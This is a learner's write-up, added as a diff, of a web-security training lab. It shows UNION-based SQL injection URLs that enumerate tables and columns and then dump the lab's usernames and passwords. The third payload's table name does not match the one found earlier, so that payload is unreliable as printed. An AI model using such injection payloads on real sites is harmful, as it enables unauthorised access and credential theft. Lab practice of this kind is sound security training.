@@ -1,0 +1,29 @@
+ This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+Hint
+
+You can find some useful payloads on our SQL injection cheat sheet.
+
+url:        https://0a69007c04533779c07f7b4100ef004d.web-security-academy.net/filter?category=Gifts
+
+After determine the columns of the table and the data types in each columns
+
+Use payload1 to determine the name of tables in the database:
+payload1:   https://0a69007c04533779c07f7b4100ef004d.web-security-academy.net/filter?category=Gifts'+union+select+table_name,null+from+information_schema.tables--
+
+After determine the name of the table holds information about the users is users_cszhec we use payload2 to determine the name of columns in that table:
+payload2:   https://0a69007c04533779c07f7b4100ef004d.web-security-academy.net/filter?category=Gifts'+union+select+column_name,null+from+information_schema.columns+where+table_name%3d'users_cszhec'--
+
+So, there are two columns in the table are username_jpwilk and password_tabsbz.
+
+The last step is use union select to retrieve username and password form table users_cszhec:
+payload3:   https://0a69007c04533779c07f7b4100ef004d.web-security-academy.net/filter?category=Gifts'+union+select+username_jpwilk,password_tabsbz+from+users_cszhecus--
+
+And then we have the information about the users include administrator
+username        password
+administrator   qt0t61spm3a4g9dh7uw6
+wiener          fz5g2fmtplq6vf3niiyp
+carlos          dcdq39ggyx8hngr3r4bp
